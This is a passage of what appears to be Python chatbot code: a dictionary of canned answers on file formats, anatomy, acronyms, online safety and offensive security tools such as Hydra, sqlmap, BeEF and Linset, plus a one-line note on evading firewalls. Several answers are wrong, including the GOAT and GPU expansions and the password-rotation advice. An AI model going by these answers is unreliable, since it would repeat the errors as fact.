            "csv meaning", 
            "what is csv used for"
        }): "CSV (Comma-Separated Values) is a plain-text file format used to store tabular data, where each line represents a row and values are separated by commas. It is commonly used for data exchange and spreadsheets.",

        frozenset({
            "what is txt", 
            "txt file format", 
            "explain txt format", 
            "what does txt mean", 
            "txt meaning", 
            "what is txt used for"
        }): "TXT is a plain-text file format used to store unformatted text. It is simple and lightweight, making it ideal for notes, code, and basic text storage.",

        frozenset({
            "what is pdf", 
            "pdf file format", 
            "explain pdf format", 
            "what does pdf mean", 
            "pdf meaning", 
            "what is pdf used for"
        }): "PDF (Portable Document Format) is a file format created by Adobe to present documents in a consistent layout, regardless of software, hardware, or operating system. It is widely used for sharing formatted text and graphics.",

        frozenset({
            "what is jpeg", 
            "jpeg file format", 
            "explain jpeg format", 
            "what does jpeg mean", 
            "jpeg meaning", 
            "what is jpeg used for"
        }): "JPEG (Joint Photographic Experts Group) is a commonly used image format that compresses images to reduce file size while maintaining visual quality. It is ideal for photos and web images.",

        frozenset({
            "what is png", 
            "png file format", 
            "explain png format", 
            "what does png mean", 
            "png meaning", 
            "what is png used for"
        }): "PNG (Portable Network Graphics) is an image format that supports lossless compression and transparency. It is commonly used for web graphics and images that require transparency.",

        frozenset({
            "what is gif", 
            "gif file format", 
            "explain gif format", 
            "what does gif mean", 
            "gif meaning", 
            "what is gif used for"
        }): "GIF (Graphics Interchange Format) is an image format that supports both static and animated images. It is widely used for short animations and web graphics.",

        frozenset({
            "what is avi", 
            "avi file format", 
            "explain avi format", 
            "what does avi mean", 
            "avi meaning", 
            "what is avi used for"
        }): "AVI (Audio Video Interleave) is a multimedia container format introduced by Microsoft. It is used to store video and audio but has larger file sizes compared to newer formats like MP4.",

        frozenset({
            "what is zip", 
            "zip file format", 
            "explain zip format", 
            "what does zip mean", 
            "zip meaning", 
            "what is zip used for"
        }): "ZIP is a compressed file format used to bundle and compress multiple files into one archive. It reduces file size for easier storage and transfer.",

        frozenset({
            "what is rar", 
            "rar file format", 
            "explain rar format", 
            "what does rar mean", 
            "rar meaning", 
            "what is rar used for"
        }): "RAR (Roshal Archive) is a proprietary archive file format that compresses data. It is commonly used for file compression and supports password protection.",

        frozenset({
            "what is html", 
            "html file format", 
            "explain html format", 
            "what does html mean", 
            "html meaning", 
            "what is html used for"
        }): "HTML (HyperText Markup Language) is a standard language for creating web pages. It structures content for display on web browsers.",

        frozenset({
            "what is json", 
            "json file format", 
            "explain json format", 
            "what does json mean", 
            "json meaning", 
            "what is json used for"
        }): "JSON (JavaScript Object Notation) is a lightweight data-interchange format that is easy for humans to read and write and easy for machines to parse and generate. It is commonly used in web development and APIs.",
        
        frozenset({
            "what is dna",
            "what is dna?",
            "define dna",
            "tell me about dna",
            "dna explained"
        }): "DNA (Deoxyribonucleic Acid) is the molecule that carries genetic instructions for the growth, development, functioning, and reproduction of all living organisms.",

        frozenset({
            "what is rna",
            "what is rna?",
            "define rna",
            "tell me about rna",
            "rna explained"
        }): "RNA (Ribonucleic Acid) is a molecule similar to DNA but plays a role in protein synthesis and carrying genetic information from the DNA to the rest of the cell.",

        frozenset({
            "what is the spine",
            "what is spine",
            "what is the spine?",
            "define spine",
            "tell me about spine",
            "spine explained"
        }): "The spine, or vertebral column, is a bony structure that supports the body, protects the spinal cord, and allows for flexible movement.",

        frozenset({
            "what are the bones",
            "what are bones",
            "what are the bones?",
            "define bones",
            "tell me about bones",
            "bones explained"
        }): "Bones are rigid structures that make up the skeleton, providing support, protection for organs, and enabling movement.",

        frozenset({
            "what is the stomach",
            "what is the stomach?",
            "define stomach",
            "tell me about stomach",
            "stomach explained"
        }): "The stomach is a digestive organ that breaks down food, mixing it with gastric juices before passing it into the small intestine.",

        frozenset({
            "what is the intestines",
            "what is intestines",
            "what are the intestines?",
            "define intestines",
            "tell me about intestines",
            "intestines explained"
        }): "The intestines are a long tube system that absorbs nutrients and water from food. The small intestine absorbs nutrients, while the large intestine absorbs water and forms waste.",

        frozenset({
            "what is the blood",
            "what is the blood?",
            "define blood",
            "tell me about blood",
            "blood explained"
        }): "Blood is a fluid that circulates throughout the body, transporting oxygen, nutrients, hormones, and waste products.",

        frozenset({
            "what is satellite internet", 
            "explain satellite internet", 
            "satellite internet meaning", 
            "how does satellite internet work", 
            "satellite internet explanation", 
            "what does satellite internet mean", 
            "what is the purpose of satellite internet"
        }): "Satellite internet is a type of internet connection that uses satellites to provide internet access to users. A signal is sent from a ground station to a satellite in orbit, which then transmits it to a dish at the user's location. It is commonly used in remote or rural areas where traditional internet options are unavailable.",

        frozenset({
            "what are good questions to ask about technology?",
            "best tech questions",
            "good questions about tech",
            "what are the best questions about tech",
            "what are the best questions about technology",
            "best questions to ask about tech",
            "best questions to ask about technology",
            "best questions to ask about tech?",
            "best questions to ask about technology?",
            "good questions to ask about tech?",
            "good questions to ask about technology",
            "best tech questions to ask",
            "best technology questions to ask",
            "tell me best tech questions to ask"
        }): """
There are many good questions to ask about technology, depending on your interests and the specific area of technology you want to explore. Here are some examples:

1. What emerging technologies are likely to have the biggest impact on society in the next 5-10 years?

2. How can technology be used to improve healthcare outcomes and patient experiences?

3. What are the ethical implications of using artificial intelligence (AI) in decision-making?

4. How can technology be used to make education more accessible and effective for all students?

5. How can we ensure that technology is developed and used in ways that are safe and secure for individuals and society?

6. What are the potential risks and benefits of using blockchain technology in various industries?

7. How can technology be used to address climate change and other environmental challenges?

8. What is the future of work in a world where automation and AI are becoming increasingly prevalent?

9. How can technology be used to promote social justice and equality?

10. What are the potential implications of quantum computing on various industries and society as a whole?
        """,

        frozenset({
            "what is the cloud", 
            "what is cloud",
            "explain the cloud", 
            "cloud meaning", 
            "what does the cloud mean", 
            "what is cloud computing", 
            "how does the cloud work"
        }): "The cloud refers to servers and services accessed over the internet to store, manage, and process data. It eliminates the need for physical storage devices by enabling remote access.",

        frozenset({
            "how do i protect my data online", 
            "ways to protect my data online", 
            "how can i secure my online data", 
            "protecting data online", 
            "tips to keep my data safe online", 
            "how to safeguard data on the internet"
        }): "To protect your data online, use strong passwords, enable two-factor authentication, avoid public Wi-Fi for sensitive tasks, keep software updated, and avoid clicking on unknown links.",

        frozenset({
            "is it safe to use public wi-fi", 
            "safety of public wi-fi", 
            "can i use public wi-fi safely", 
            "how safe is public wi-fi", 
            "public wi-fi security", 
            "is using public wi-fi dangerous"
        }): "Public Wi-Fi is generally not safe as it lacks encryption. Use a VPN or avoid accessing sensitive accounts to enhance security.",

        frozenset({
            "what is the difference between a virus and malware", 
            "difference between virus and malware", 
            "how is malware different from a virus", 
            "virus vs malware", 
            "explain virus and malware difference", 
            "is a virus the same as malware"
        }): "A virus is a type of malware designed to replicate and spread by infecting files. Malware is a broader term for malicious software, including viruses, ransomware, spyware, and more.",

        frozenset({
            "how often should i change my password", 
            "password change frequency", 
            "when should i update my password", 
            "how regularly should passwords be updated", 
            "tips on when to change passwords", 
            "how frequently to change passwords"
        }): "It's recommended to change passwords every 3-6 months, or immediately if there's a breach. Use strong, unique passwords for each account.",

        frozenset({
            "what is the best antivirus software", 
            "recommend the best antivirus", 
            "which antivirus software is the best", 
            "best antivirus options", 
            "what antivirus should i use", 
            "how to choose the best antivirus"
        }): "The best antivirus software depends on your needs, but popular options include Norton, Bitdefender, Kaspersky, and McAfee. Look for features like real-time protection and malware scanning.",

        frozenset({
            "should i be concerned about privacy on social media", 
            "is privacy on social media a concern", 
            "social media privacy concerns", 
            "should i worry about social media privacy", 
            "how to ensure privacy on social media", 
            "is my data private on social media"
        }): "Yes, social media platforms often collect and share user data. Review privacy settings, limit personal information shared, and think before posting sensitive content.",

        frozenset({
            "what is a vpn and how does it work", 
            "explain vpn and its working", 
            "how does a vpn work", 
            "what does vpn mean", 
            "vpn meaning and function", 
            "what is vpn used for"
        }): "A VPN (Virtual Private Network) encrypts your internet connection and routes it through a server, hiding your IP address and protecting your data. It ensures privacy and allows access to restricted content.",

        frozenset({
            "what is the latest tech trend", 
            "latest trends in technology", 
            "new tech trends", 
            "what are the current tech trends", 
            "latest technology advancements", 
            "recent trends in technology"
        }): "Latest tech trends include AI advancements, generative AI tools, Web3, quantum computing, 5G expansion, and sustainable tech innovations.",
        
        frozenset({
            "what is the pancreas",
            "what is the pancreas?",
            "define pancreas",
            "tell me about pancreas",
            "pancreas explained"
        }): "The pancreas is an organ that produces insulin and other hormones, as well as enzymes for digestion.",

        frozenset({
            "what are the eyes",
            "what are the eyes?",
            "define eyes",
            "tell me about eyes",
            "eyes explained"
        }): "The eyes are organs that detect light and enable vision, allowing organisms to perceive their surroundings.",

        frozenset({
            "what are the ears",
            "what are the ears?",
            "define ears",
            "tell me about ears",
            "ears explained"
        }): "The ears are sensory organs responsible for hearing and balance, detecting sound waves and changes in position.",

        frozenset({
            "what is the nose",
            "what is the nose?",
            "define nose",
            "tell me about nose",
            "nose explained"
        }): "The nose is the organ responsible for smelling and filtering air before it enters the lungs.",

        frozenset({
            "what are the hands",
            "what are the hands?",
            "define hands",
            "tell me about hands",
            "hands explained"
        }): "The hands are appendages with fingers that allow for grasping, touching, and manipulating objects.",

        frozenset({
            "what are the legs",
            "what are the legs?",
            "define legs",
            "tell me about legs",
            "legs explained"
        }): "The legs are limbs that support the body and enable movement, including walking, running, and jumping.",

        frozenset({
            "what is goat fullform",
            "full form of goat",
            "goat full form",
            "g.o.at.t full form",
            "what is goat fullform?",
            "full form of goat?",
            "goat full form?",
            "g.o.a.t full form?"
        }): "Goat/G.O.A.T fullform is Great Of All Time.",

        frozenset({
            "what is atm fullform",
            "atm full form",
            "full form of atm",
            "what is atm fullform?",
            "atm full form?",
            "full form of atm?"
        }): "ATM full form is Automated Teller Machine.",

        frozenset({
            "what is pc fullform",
            "full form of pc",
            "pc full form",
            "what is pc fullform?",
            "full form of pc?",
            "pc full form?"
        }): "PC full form is Personal Computer.",

        frozenset({
            "what is usb fullform",
            "usb full form",
            "full form of usb",
            "what is usb fullform?",
            "usb full form?",
            "full form of usb?"
        }): "USB full form is Universal Serial Bus.",

        frozenset({
            "what is wifi fullform",
            "wifi full form",
            "full form of wifi",
            "what is wifi fullform?",
            "wifi full form?",
            "full form of wifi?"
        }): "Wi-Fi full form is Wireless Fidelity.",

        frozenset({
            "what is gps fullform",
            "gps full form",
            "full form of gps",
            "what is gps fullform?",
            "gps full form?",
            "full form of gps?"
        }): "GPS full form is Global Positioning System.",

        frozenset({
            "what is http fullform",
            "http full form",
            "full form of http",
            "what is http fullform?",
            "http full form?",
            "full form of http?"
        }): "HTTP full form is HyperText Transfer Protocol.",

        frozenset({
            "how to find vulnerabilities in a system",
            "how do i identify system vulnerabilities",
            "ways to find vulnerabilities in systems",
            "what are methods to find system vulnerabilities",
            "find system vulnerabilities",
            "identify vulnerabilities",
            "methods to find vulnerabilities",
            "how to detect system weaknesses",
            "how to find vulnerabilities in a system?",
            "how do i identify system vulnerabilities?",
            "ways to find vulnerabilities in systems?",
            "what are methods to find system vulnerabilities?",
            "find system vulnerabilities?",
            "identify vulnerabilities?",
            "methods to find vulnerabilities?",
            "how to detect system weaknesses?"
        }): "Vulnerabilities in a system can be found using penetration testing, vulnerability scanners like Nessus, and manual testing with knowledge of common exploits.",
        
        frozenset({
            "what tools are best for penetration testing",
            "which tools are used for penetration testing",
            "best tools for penetration testing",
            "tools for pen testing",
            "best penetration testing tools",
            "tools for penetration test",
            "what tools are best for penetration testing?",
            "which tools are used for penetration testing?",
            "best tools for penetration testing?",
            "tools for pen testing?",
            "best penetration testing tools?",
            "tools for penetration test?"
        }): "Common tools for penetration testing include Metasploit, Nmap, Burp Suite, and Wireshark.",
        
        frozenset({
            "how to bypass firewalls",
            "ways to bypass firewalls",
            "methods to bypass antivirus",
            "how do i evade firewalls and antivirus",
            "bypass firewalls",
            "evade antivirus",
            "bypass security systems",
            "what tools are best for penetration testing?",
            "which tools are used for penetration testing?",
            "best tools for penetration testing?",
            "tools for pen testing?",
            "best penetration testing tools?",
            "tools for penetration test?"
        }): "Firewalls and antivirus systems can be bypassed through methods like obfuscation of payloads, encrypting communication, or using advanced evasion techniques (for ethical use).",
        
        frozenset({
            "how does social engineering work",
            "what is social engineering in hacking",
            "methods of social engineering",
            "how to use social engineering",
            "what is social engineering",
            "how to trick people using social engineering",
            "how does social engineering work?",
            "what is social engineering in hacking?",
            "methods of social engineering?",
            "how to use social engineering?",
            "what is social engineering?",
            "how to trick people using social engineering?"
        }): "Social engineering manipulates human behavior to gain unauthorized access, often through phishing, pretexting, or impersonation.",
        
        frozenset({
            "how to perform a port scan",
            "ways to scan ports",
            "what is port scanning",
            "tools for port scanning",
            "how to scan ports",
            "port scanning methods",
            "how to perform a port scan?",
            "ways to scan ports?",
            "what is port scanning?",
            "tools for port scanning?",
            "how to scan ports?",
            "port scanning methods?"
        }): "Port scanning identifies open ports and services on a target machine, typically done using tools like Nmap or Masscan.",
        
        frozenset({
            "difference between tcp and udp attacks",
            "tcp vs udp attacks",
            "how are tcp and udp attacks different",
            "tcp and udp attack types",
            "tcp and udp attacks",
            "difference between tcp and udp attacks?",
            "tcp vs udp attacks?",
            "how are tcp and udp attacks different?",
            "tcp and udp attack types?",
            "tcp and udp attacks?"
        }): "TCP attacks often involve SYN floods, while UDP attacks involve amplification or flooding attacks exploiting the stateless protocol.",
        
        frozenset({
            "how to sniff data",
            "ways to sniff network data",
            "what is packet sniffing",
            "tools for data sniffing",
            "how to capture network data",
            "sniffing network traffic",
            "how to sniff data?",
            "ways to sniff network data?",
            "what is packet sniffing?",
            "tools for data sniffing?",
            "how to capture network data?",
            "sniffing network traffic?"
        }): "Data sniffing captures network packets using tools like Wireshark or tcpdump for analysis.",
        
        frozenset({
            "how do sql injections work",
            "ways to exploit sql vulnerabilities",
            "what is sql injection",
            "sql injection attack methods",
            "how to perform sql injection",
            "sql injection techniques",
            "how do sql injections work?",
            "ways to exploit sql vulnerabilities?",
            "what is sql injection?",
            "sql injection attack methods?",
            "how to perform sql injection?",
            "sql injection techniques?"
        }): "SQL injection involves manipulating database queries through input fields to access or manipulate sensitive data.",
        
        frozenset({
            "how to crack hashed passwords",
            "ways to decrypt hashed passwords",
            "what are methods for password cracking",
            "tools for cracking password hashes",
            "how to crack password hashes",
            "password cracking techniques",
            "how to crack hashed passwords?",
            "ways to decrypt hashed passwords?",
            "what are methods for password cracking?",
            "tools for cracking password hashes?",
            "how to crack password hashes?",
            "password cracking techniques?"
        }): "Cracking hashed passwords can be done using brute force, dictionary attacks, or rainbow tables with tools like Hashcat or John the Ripper.",
            
        frozenset({
            "what is url fullform",
            "url full form",
            "full form of url",
            "what is url fullform?",
            "url full form?",
            "full form of url?"
        }): "URL full form is Uniform Resource Locator.",

        frozenset({
            "best tools of termux for me no root",
            "tell me some tools for termux",
            "useful termux tools",
            "best termux tools",
            "termux best tools",
            "best termux no root tools",
            "best termux tools no root",
            "tell me useful termux tools no root",
            "best termux tools",
            "best tools for termux",
            "tell me some of the termux tools",
            "amazing termux tools",
            "tell me amazing termux tools"
        }):'''Here are some of the BEST AND USEFUL TERMUX TOOLS you can use without root access:

# For System Information and Utilities
1. neofetch: Displays system information in a visually appealing format.
- Install: 'pkg install neofetch'
- Run: 'neofetch'

2. htop: A system-monitoring tool to view running processes.
- Install: 'pkg install htop'
- Run: 'htop'

3. screenfetch: Similar to 'neofetch' for system details.
- Install: 'pkg install screenfetch'
- Run: 'screenfetch'

-----------------------

# For Programming and Development
1. Python: Develop Python scripts directly in Termux.
- Install: 'pkg install python'
- Use: 'python' or 'python3'

2. Node.js: For JavaScript programming.
- Install: 'pkg install nodejs'

3. Git: Version control tool to manage code repositories.
- Install: 'pkg install git'
- Use: Clone repositories, contribute to projects, etc.

4. nano/vim: Lightweight text editors for coding.
- Install: 'pkg install nano' or 'pkg install vim'

5. Termux:API: Access device features like battery status, location, etc.
- Install: 'pkg install termux-api'

-----------------------

# For Networking and Penetration Testing
1. nmap: Network scanning and security auditing tool.
- Install: 'pkg install nmap'

2. wget/curl: Tools to download files from the web.
- Install: 'pkg install wget' or 'pkg install curl'

3. ping: Test the connectivity of servers.
- Default in Termux.

4. hydra: For password cracking (ethical hacking practice).
- Install: 'pkg install hydra'

-----------------------

# For Productivity
1. mc (Midnight Commander)**: File manager for Termux.
- Install: 'pkg install mc'

2. ranger: Another powerful file manager.
- Install: 'pkg install ranger'

3. cmatrix: A fun matrix-like screensaver.
- Install: 'pkg install cmatrix'
- Run: 'cmatrix'

4. termux-clipboard: Manage clipboard easily.
- Install: 'pkg install termux-clipboard'

-----------------------

# For Learning and Fun
1. cowsay: Fun ASCII art with text bubbles.
- Install: 'pkg install cowsay'
- Use: 'cowsay "Hello World!"'

2. figlet: Convert text into ASCII art.
- Install: 'pkg install figlet'
- Use: 'figlet Hello'

3. sl (Steam Locomotive)**: Displays a train animation.
- Install: 'pkg install sl'
- Run: 'sl'

-----------------------

# Customizing Termux
1. zsh: Enhance the terminal with themes and plugins.
- Install: 'pkg install zsh'
- Use: Combine with 'oh-my-zsh' for customization.

2. powerline: Status line and prompt theme.
- Install: 'pkg install powerline'

3. termux-style: Change themes and fonts in Termux.
- Install: 'git clone https://github.com/adi1090x/termux-style.git'
- Run: Follow the instructions in the README file.

----------------------------------------------------------
----------------------------------------------------------
# Key Points
- No Root Required: All these tools work without root.
- Secure Usage: Be ethical while using tools like 'hydra' and 'nmap'.
- Expand Abilities: Use Termux packages like Python and Git for learning and development.''',
        frozenset({
            "what is ram fullform",
            "ram full form",
            "full form of ram",
            "what is ram fullform?",
            "ram full form?",
            "full form of ram?"
        }): "RAM full form is Random Access Memory.",

        frozenset({
            "what is ip fullform",
            "ip full form",
            "full form of ip",
            "what is ip fullform?",
            "ip full form?",
            "full form of ip?"
        }): "IP full form is Internet Protocol.",

        frozenset({
            "full form of gpu",
            "gpu full form",
            "what is the full form",
            "full form of gpu??",
            "gpu full form?",
            "what is the full form?"
        }): "GPU full form is Graphical Processing Unit",

        frozenset({
            "what is vpn fullform",
            "vpn full form",
            "full form of vpn",
            "what is vpn fullform?",
            "vpn full form?",
            "full form of vpn?"
        }): "VPN full form is Virtual Private Network.",

        frozenset({
            "what is hd fullform",
            "hd full form",
            "full form of hd",
            "what is hd fullform?",
            "hd full form?",
            "full form of hd?"
        }): "HD full form is High Definition.",

        frozenset({
            "what is the full form of ups",
            "full form of ups",
            "ups full form",
            "what is full form of ups"
        }): "UPS stands for Uninterruptible Power Supply",

        frozenset({
            "what is the full form of psu",
            "full form of psu",
            "psu full form",
            "full form of psu",
            "what is full form of psu",
            "full form of psu?"
        }): "PSU stands for Power Supply Unit",

        frozenset({
            "best app for language learning",
            "tell me best app for learning language",
            "tell me best app for learning language",
            "best app for language learning",
            "which is the best app for language learning",
            "app for learning language",
            "tell me a app for language learning",
            "best app for language learning",
            "app for learning language"
        }): "You can try Duolingo for Learning Language.",

        frozenset({
            "what is pdf fullform",
            "pdf full form",
            "full form of pdf",
            "what is pdf fullform?",
            "pdf full form?",
            "full form of pdf?"
        }): "PDF full form is Portable Document Format.",

        frozenset({
            "what is sms fullform",
            "sms full form",
            "full form of sms",
            "what is sms fullform?",
            "sms full form?",
            "full form of sms?"
        }): "SMS full form is Short Message Service.",

        frozenset({
            "what is ceo fullform",
            "ceo full form",
            "full form of ceo",
            "what is ceo fullform?",
            "ceo full form?",
            "full form of ceo?"
        }): "CEO full form is Chief Executive Officer.",

        frozenset({
            "what is hr fullform",
            "hr full form",
            "full form of hr",
            "what is hr fullform?",
            "hr full form?",
            "full form of hr?"
        }): "HR full form is Human Resources.",

        frozenset({
            "what is diy fullform",
            "diy full form",
            "full form of diy",
            "what is diy fullform?",
            "diy full form?",
            "full form of diy?"
        }): "DIY full form is Do It Yourself.",

        frozenset({
            "what is rip fullform",
            "rip full form",
            "full form of rip",
            "what is rip fullform?",
            "rip full form?",
            "full form of rip?"
        }): "RIP full form is Rest In Peace.",

        frozenset({
            "what is lol fullform",
            "lol full form",
            "full form of lol",
            "what is lol fullform?",
            "lol full form?",
            "full form of lol?"
        }): "LOL full form is Laugh Out Loud.",

        frozenset({
            "what is metasploit",
            "explain metasploit",
            "define metasploit",
            "what is metasploit?",
            "tell me what is metasploit?",
            "tell me what is metasploit"
        }): "The Metasploit Framework is an open-source penetration testing tool that allows users to develop and run exploit code against a remote target machine. It is a sub-project of the Metasploit Project, which also includes anti-forensic and evasion tools",

        frozenset({
            "what is nmap",
            "explain nmap",
            "define nmap",
            "what is nmap?",
            "tell me what is nmap?",
            "tell me what is nmap"
        }): "Nmap (Network Mapper) is an open-source tool for network discovery and security auditing. It can be used to discover hosts and services on a computer network, thus creating a 'map' of the network.",

        frozenset({
            "what is wireshark",
            "explain wireshark",
            "define wireshark",
            "what is wireshark?",
            "tell me what is wireshark?",
            "tell me what is wireshark"
        }): "Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education.",

        frozenset({
            "what is aircrack-ng",
            "explain aircrack-ng",
            "define aircrack-ng",
            "what is aircrack-ng?",
            "tell me what is aircrack-ng?",
            "tell me what is aircrack-ng"
        }): "Aircrack-ng is a suite of tools used for wireless network security auditing. It focuses on key cracking and monitoring, primarily targeting WEP and WPA-PSK security protocols.",

        frozenset({
            "what is hydra",
            "explain hydra",
            "define hydra",
            "what is hydra?",
            "tell me what is hydra?",
            "tell me what is hydra"
        }): "Hydra is a fast and flexible password-cracking tool that supports various protocols such as FTP, SSH, HTTP, and more. It's used for brute-forcing login credentials on a network service.",
        
        frozenset({
            "what is burp suite",
            "explain burp suite",
            "define burp suite",
            "what is burp suite?",
            "tell me what is burp suite?",
            "tell me what is burp suite"
        }): "Burp Suite is an integrated platform used for testing the security of web applications. It provides tools for scanning, crawling, and analyzing web traffic, enabling penetration testers to find and exploit vulnerabilities.",

        frozenset({
            "what is sslstrip",
            "explain sslstrip",
            "define sslstrip",
            "what is sslstrip?",
            "tell me what is sslstrip?",
            "tell me what is sslstrip"
        }): "SSLStrip is a man-in-the-middle (MITM) tool used to downgrade secure HTTPS connections to unencrypted HTTP. It allows attackers to intercept and modify traffic between a client and server.",

        frozenset({
            "what is enum4linux",
            "what is enum 4 linux",
            "explain enum4linux",
            "define enum4linux",
            "what is enum4linux?",
            "tell me what is enum4linux?",
            "tell me what is enum4linux"
        }): "Enum4linux is a Linux tool used to gather information from Windows machines using the SMB protocol. It helps penetration testers retrieve valuable details like user accounts, shares, and system information.",

        frozenset({
            "what is dirb",
            "explain dirb",
            "define dirb",
            "what is dirb?",
            "tell me what is dirb?",
            "tell me what is dirb"
        }): "Dirb is a web content scanner that performs directory brute-forcing attacks. It is used to find hidden directories and files on a web server by using a wordlist to attempt various common paths.",

        frozenset({
            "what is dnschef",
            "explain dnschef",
            "define dnschef",
            "what is dnschef?",
            "tell me what is dnschef?",
            "tell me what is dnschef"
        }): "DNSChef is a DNS proxy tool used for man-in-the-middle attacks. It can modify DNS responses, redirect traffic, and perform DNS spoofing for testing purposes.",

        frozenset({
            "what is crackmapexec",
            "what is crack mapexec",
            "explain crackmapexec",
            "define crackmapexec",
            "what is crackmapexec?",
            "tell me what is crackmapexec?",
            "tell me what is crackmapexec"
        }): "CrackMapExec is a post-exploitation tool used by penetration testers for network enumeration and lateral movement. It automates common tasks in network penetration testing such as SMB, RDP, and WMI enumeration.",

        frozenset({
            "what is empire",
            "explain empire",
            "define empire",
            "what is empire?",
            "tell me what is empire?",
            "tell me what is empire"
        }): "Empire is a post-exploitation and lateral movement tool that allows for executing PowerShell-based payloads. It is often used for penetration testing and red team operations to maintain persistence and control over a compromised system.",

        frozenset({
            "what is nikto",
            "explain nikto",
            "define nikto",
            "what is nikto?",
            "tell me what is nikto?",
            "tell me what is nikto"
        }): "Nikto is a web server scanner that identifies vulnerabilities and misconfigurations in web servers. It checks for outdated software, security flaws, and possible attack vectors.",

        frozenset({
            "what is metasploit pro",
            "explain metasploit pro",
            "define metasploit pro",
            "what is metasploit pro?",
            "tell me what is metasploit pro?",
            "tell me what is metasploit pro"
        }): "Metasploit Pro is a commercial version of the Metasploit Framework, designed for professionals. It includes advanced automation features for penetration testing, vulnerability assessment, and reporting.",

        frozenset({
            "what is msfvenom",
            "explain msfvenom",
            "define msfvenom",
            "what is msfvenom?",
            "tell me what is msfvenom?",
            "tell me what is msfvenom"
        }): "MSFvenom is a command-line tool within the Metasploit Framework that is used for generating payloads. It combines the functionality of msfpayload and msfencode to create malicious payloads for exploitation.",

        frozenset({
            "what is tshark",
            "explain tshark",
            "define tshark",
            "what is tshark?",
            "tell me what is tshark?",
            "tell me what is tshark"
        }): "Tshark is a network protocol analyzer that provides the capabilities of Wireshark in a terminal-based interface. It is used for capturing and analyzing network traffic in real-time.",

        frozenset({
            "what is hashcat",
            "explain hashcat",
            "define hashcat",
            "what is hashcat?",
            "tell me what is hashcat?",
            "tell me what is hashcat"
        }): "Hashcat is a password cracking tool that is highly efficient in breaking various hash algorithms using dictionary attacks, brute-force methods, and rule-based attacks.",

        frozenset({
            "what is xsser",
            "explain xsser",
            "define xsser",
            "what is xsser?",
            "tell me what is xsser?",
            "tell me what is xsser"
        }): "XSSer is an automatic framework for detecting and exploiting Cross-Site Scripting (XSS) vulnerabilities in web applications. It automates the testing process for XSS flaws.",

        frozenset({
            "what is openvas",
            "explain openvas",
            "define openvas",
            "what is openvas?",
            "tell me what is openvas?",
            "tell me what is openvas"
        }): "OpenVAS (Open Vulnerability Assessment System) is an open-source vulnerability scanner used for scanning and assessing the security of a system or network to detect known vulnerabilities.",

        frozenset({
            "what is metasploit community",
            "explain metasploit community",
            "define metasploit community",
            "what is metasploit community?",
            "tell me what is metasploit community?",
            "tell me what is metasploit community"
        }): "Metasploit Community is a free version of the Metasploit Framework intended for small-scale penetration testing. It includes basic features such as exploiting vulnerabilities and testing systems, but lacks the full set of advanced tools available in the Pro version.",

        frozenset({
            "what is wpscan",
            "explain wpscan",
            "define wpscan",
            "what is wpscan?",
            "tell me what is wpscan?",
            "tell me what is wpscan"
        }): "WPScan is a WordPress vulnerability scanner that is designed to find vulnerabilities in WordPress websites, including outdated plugins, weak passwords, and potential security flaws.",

        frozenset({
            "what is medusa",
            "explain medusa",
            "define medusa",
            "what is medusa?",
            "tell me what is medusa?",
            "tell me what is medusa"
        }): "Medusa is a parallelized, distributed password-cracking tool that supports various protocols including FTP, SSH, HTTP, and more. It is designed to perform fast brute-force attacks.",

        frozenset({
            "what is sqlninja",
            "explain sqlninja",
            "define sqlninja",
            "what is sqlninja?",
            "tell me what is sqlninja?",
            "tell me what is sqlninja"
        }): "Sqlninja is a tool aimed at exploiting SQL injection vulnerabilities in web applications. It is often used to escalate privileges, extract data, or execute arbitrary commands on the target system.",

        frozenset({
            "what is zaproxy",
            "explain zaproxy",
            "define zaproxy",
            "what is zaproxy?",
            "tell me what is zaproxy?",
            "tell me what is zaproxy"
        }): "OWASP ZAP (Zed Attack Proxy) is a security testing tool for finding vulnerabilities in web applications. It is an open-source project designed for penetration testers and developers.",

        frozenset({
            "what is bruteforce",
            "explain bruteforce",
            "define bruteforce",
            "what is bruteforce?",
            "tell me what is bruteforce?",
            "tell me what is bruteforce"
        }): "Bruteforce is an attack method in which an attacker systematically attempts all possible passwords or encryption keys until the correct one is found. It can be used for cracking password-protected systems or files.",

        frozenset({
            "what is armitage",
            "explain armitage",
            "define armitage",
            "what is armitage?",
            "tell me what is armitage?",
            "tell me what is armitage"
        }): "Armitage is a graphical user interface for the Metasploit Framework. It helps penetration testers exploit network systems by automating the process of finding and launching exploits.",

        frozenset({
            "what is linset",
            "explain linset",
            "define linset",
            "what is linset?",
            "tell me what is linset?",
            "tell me what is linset"
        }): "Linset is a Wi-Fi phishing tool that is used to create fake access points in order to trick users into connecting to them. It can be used to capture WPA and WPA2 passwords.",

        frozenset({
            "what is beef",
            "explain beef",
            "define beef",
            "what is beef?",
            "tell me what is beef?",
            "tell me what is beef"
        }): "BeEF (Browser Exploitation Framework) is a penetration testing tool used for exploiting browser vulnerabilities. It focuses on controlling browsers through social engineering and exploiting weaknesses in client-side scripting.",

        frozenset({
            "what is john the ripper",
            "explain john the ripper",
            "define john the ripper",
            "what is john the ripper?",
            "tell me what is john the ripper?",
            "tell me what is john the ripper"
        }): "John the Ripper is a popular password-cracking software tool. It is used to detect weak passwords through brute-force and dictionary-based attacks and supports various hash algorithms.",

        frozenset({
            "what is gobuster",
            "explain gobuster",
            "define gobuster",
            "what is gobuster?",
            "tell me what is gobuster?",
            "tell me what is gobuster"
        }): "Gobuster is a tool used for directory and DNS busting, helping security researchers find hidden files, directories, and subdomains on web servers through brute-force attacks.",

        frozenset({
            "what is sqlmap",
            "explain sqlmap",
            "define sqlmap",
            "what is sqlmap?",
            "tell me what is sqlmap?",
            "tell me what is sqlmap"
        }): "Sqlmap is an automated penetration testing tool designed to detect and exploit SQL injection vulnerabilities in web applications. It can also automate the process of database exploitation.",

        frozenset({
            "what is reaver",
            "explain reaver",
            "define reaver",
            "what is reaver?",
            "tell me what is reaver?",
            "tell me what is reaver"
        }): "Reaver is a tool that exploits WPS (Wi-Fi Protected Setup) vulnerabilities in wireless networks to recover WPA/WPA2 passwords using brute force techniques.",

        frozenset({
            "what is kismet",
            "explain kismet",
            "define kismet",
            "what is kismet?",
            "tell me what is kismet?",
            "tell me what is kismet"
        }): "Kismet is a wireless network detector and sniffer used to capture and analyze wireless traffic. It helps identify wireless networks and track devices in the range of the wireless access points.",

        frozenset({
            "what is ettercap",
            "explain ettercap",
            "define ettercap",
            "what is ettercap?",
            "tell me what is ettercap?",
            "tell me what is ettercap"
        }): "Ettercap is a network sniffer and MITM (Man-in-the-Middle) tool that enables attackers to intercept and modify network traffic between devices on a local network.",

        frozenset({
            "what is bettercap",
            "explain bettercap",
            "define bettercap",
